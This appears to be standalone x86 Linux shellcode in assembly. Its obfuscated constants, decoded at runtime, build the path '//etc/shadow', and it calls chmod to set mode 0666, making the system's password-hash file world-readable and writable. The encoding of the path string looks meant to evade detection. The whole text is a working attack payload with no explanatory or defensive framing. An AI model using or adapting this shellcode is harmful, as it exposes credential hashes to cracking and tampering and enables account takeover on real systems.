section .text
global _start

_start:
mov al, 15
push edx
    mov edx, 0x12311021
    mov ebx, 0x653e5440
    add ebx, edx
    push ebx

    mov ebx, 0x56421f42
    add ebx, edx
    push ebx

    mov ebx, 0x62341f0e
    add ebx, edx
    push ebx
        mov ebx, esp
        mov cx, 0666o
        int 0x80
